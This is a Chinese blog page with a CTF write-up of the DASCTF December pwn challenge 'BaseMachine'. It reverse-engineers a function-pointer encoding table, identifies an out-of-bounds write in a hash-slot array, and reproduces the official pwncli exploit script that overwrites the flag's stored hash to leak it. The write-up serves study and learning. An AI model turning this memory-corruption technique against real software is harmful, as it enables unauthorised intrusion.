@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#54C8C4" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/180pixil-frame-0.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32pixil-frame-0.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16pixil-frame-0.png">
+  <link rel="mask-icon" href="/images/pixil-frame-0.png.svg" color="#54C8C4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic%7CNoto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言 本次DASCTF 12月赛尝试了pwn方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF12月赛复现">
+<meta property="og:url" content="http://example.com/2025/01/08/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="蘅芷清芬">
+<meta property="og:description" content="前言 本次DASCTF 12月赛尝试了pwn方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108110826276.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108110920209.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108111643902.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108114221721.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108114849186.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108115753563.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108121903389.png">
+<meta property="og:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250110222812447.png">
+<meta property="article:published_time" content="2025-01-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-10T15:00:52.000Z">
+<meta property="article:author" content="summ2">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="函数指针">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250108110826276.png">
+
+
+<link rel="canonical" href="http://example.com/2025/01/08/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/01/08/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/","path":"2025/01/08/202518-DASCTF12月赛复现/","title":"DASCTF12月赛复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DASCTF12月赛复现 | 蘅芷清芬</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">蘅芷清芬</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa-solid fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-ctf"><a href="/categories/CTF" rel="section"><i class="fa-solid fa-flag fa-fw"></i>CTF</a></li><li class="menu-item menu-item-日常"><a href="/categories/%E6%97%A5%E5%B8%B8" rel="section"><i class="fa-solid fa-file fa-fw"></i>日常</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa-solid fa-tags fa-fw"></i>标签</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#basemachine"><span class="nav-number">2.</span> <span class="nav-text">BaseMachine</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">2.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerabilities"><span class="nav-number">2.3.</span> <span class="nav-text">Vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.4.</span> <span class="nav-text">攻击流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">summ2</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/avasummer" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;avasummer" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:summ2@hdu.edu.cn" title="E-Mail → mailto:summ2@hdu.edu.cn" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/08/202518-DASCTF12%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="summ2">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="蘅芷清芬">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DASCTF12月赛复现 | 蘅芷清芬">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DASCTF12月赛复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-08 00:00:00" itemprop="dateCreated datePublished" datetime="2025-01-08T00:00:00+08:00">2025-01-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言">前言</h1>
+<p>本次DASCTF
+12月赛尝试了pwn方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。
+<span id="more"></span></p>
+<h1 id="basemachine">BaseMachine</h1>
+<h2 id="checksec">checksec</h2>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108110826276.png"
+alt="保护全开" />
+<figcaption aria-hidden="true">保护全开</figcaption>
+</figure>
+<h2 id="逆向分析">逆向分析</h2>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108110920209.png"
+alt="main" />
+<figcaption aria-hidden="true">main</figcaption>
+</figure>
+<p>读入 <code>./flag</code> 后传入
+<code>sub_3990</code>，图中的乱码是表情，是IDA的编码问题。后面是循环读入用户输入，同样传入
+<code>sub_3990</code>。</p>
+<p>进入 <code>sub_3990</code> 继续分析：</p>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108111643902.png"
+alt="v9" />
+<figcaption aria-hidden="true">v9</figcaption>
+</figure>
+<p>根据传入的参数 <code>a1</code>, <code>a2</code>
+决定程序后续流程，具体是编码类型(base64, base85...)。</p>
+<p>有意思的是，程序将字符串的加解密流程放在在 <code>_data</code>
+，即数据段中。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v10 = ((__int64 (__fastcall *)(<span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *))*(&amp;off_7260 + v8))(s, a3);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000007260 off_7260        dq offset sub_1D6A      ; DATA XREF: sub_3990+155↑o</span><br><span class="line">.data:0000000000007260                                         ; sub_3990+1C8↑o</span><br><span class="line">.data:0000000000007268                 dq offset sub_1ED6</span><br><span class="line">.data:0000000000007270                 dq offset sub_22B2</span><br><span class="line">.data:0000000000007278                 dq offset sub_27D4</span><br><span class="line">.data:0000000000007280                 dq offset sub_2B94</span><br><span class="line">.data:0000000000007288                 dq offset sub_2E17</span><br><span class="line">.data:0000000000007290                 dq offset sub_3498</span><br><span class="line">.data:0000000000007290 _data           ends</span><br><span class="line">.data:0000000000007290</span><br></pre></td></tr></table></figure>
+<p>这涉及到C语言中<strong>函数指针</strong>的概念:</p>
+<p>函数指针是一个指向函数的<strong>指针</strong>变量，如：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> (*p)(<span class="type">int</span> x, <span class="type">int</span>  y);</span><br></pre></td></tr></table></figure>
+<p>具有两个整型参数，返回值是整型。</p>
+<p>如下代码实现了通过函数指针调用函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxValue</span> <span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*p)(<span class="type">int</span>, <span class="type">int</span>) = <span class="literal">NULL</span>;</span><br><span class="line">p = maxValue;</span><br><span class="line"><span class="built_in">p</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>而题目程序中就是通过类似这样的函数指针数组实现的。</p>
+<p>接着，根据与<code>unk_73C0</code>中的数据比较这一功能可以（应该？）推测是在计算哈希</p>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108114221721.png"
+alt="wp中指出这是在计算SHA256" />
+<figcaption aria-hidden="true">wp中指出这是在计算SHA256</figcaption>
+</figure>
+<p>如果没有找到相同的，就使用新的槽位：</p>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108114849186.png"
+alt="选择最先或未使用的槽位，覆盖该槽位存储的数据" />
+<figcaption
+aria-hidden="true">选择最先或未使用的槽位，覆盖该槽位存储的数据</figcaption>
+</figure>
+<p>存、读取哈希和密文部分：</p>
+<p><img
+src="/202518-DASCTF12月赛复现\image-20250108120631350.png" /></p>
+<p>解密、输出部分：</p>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108115753563.png"
+alt="是否输出由传入参数a4决定" />
+<figcaption
+aria-hidden="true">是否输出由传入参数<code>a4</code>决定</figcaption>
+</figure>
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<p>与 <code>unk_73C0</code> 读写有关的函数 <code>sub_37A4</code>
+中存在<strong>溢出漏洞</strong></p>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250108121903389.png"
+alt="数组只能储存0-5" />
+<figcaption aria-hidden="true">数组只能储存0-5</figcaption>
+</figure>
+<figure>
+<img src="/202518-DASCTF12月赛复现\image-20250110222812447.png"
+alt="unk_73c0将编码类型和明文写入对应位置" />
+<figcaption
+aria-hidden="true"><code>unk_73c0</code>将编码类型和明文写入对应位置</figcaption>
+</figure>
+<h2 id="攻击流程">攻击流程</h2>
+<p>以下为官方wp思路。</p>
+<p>寻找具有'b85'开头SHA256值的字符串，将flag槽位上的哈希修改为这个值。具体实现如下（来自官方wp）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./BaseMachine&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./BaseMachine&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sla(<span class="string">&quot;🫠🫠🫠&quot;</span>, <span class="string">&#x27;plain b64 &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">sla(<span class="string">&quot;🫠🫠🫠&quot;</span>, <span class="string">b&#x27;plain b85 &#x27;</span> + <span class="string">b&#x27;aaaa&#x27;</span> * <span class="number">10</span> + <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;😍😍😍 &quot;</span>)</span><br><span class="line">data = ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">pad1 = data[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">pad2 = data[-<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match found! String: 6eU, SHA-256: b8509ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    sla(<span class="string">&quot;🫠🫠🫠&quot;</span>, <span class="string">b&#x27;b85 plain &#x27;</span> + <span class="string">b&#x27;09ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888aaaa&#x27;</span> + pad1 * i + pad2 + pad1 * (<span class="number">10</span> - i))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;🫠🫠🫠&quot;</span>, <span class="string">b&#x27;plain b64 6eU&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;😍😍😍 &quot;</span>)</span><br><span class="line">flag = ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">sla(<span class="string">&quot;🫠🫠🫠&quot;</span>, <span class="string">b&#x27;b64 plain &#x27;</span> + flag)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<h1 id="总结">总结</h1>
+<p>这题的作者可见对编码非常熟悉，目前我还没有对base系列有一个太清晰的了解。最多知道它大概的原理，或者仿写加解密的代码之类的。以后有空我会尝试手搓一下各种base的加解密的（之前接触base是hgame-mini
+2024上的一道逆向题——base emoji）。另外对代码的阅读能力也有待提升。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+              <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" rel="tag"><i class="fa fa-tag"></i> 函数指针</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/11/06/2024116-%E9%92%B1%E5%A1%98%E6%B1%9F%E8%BE%B9/" rel="prev" title="钱塘江边">
+                  <i class="fa fa-angle-left"></i> 钱塘江边
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+<div class="custom-footer">
+  <span>summ2's blog</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
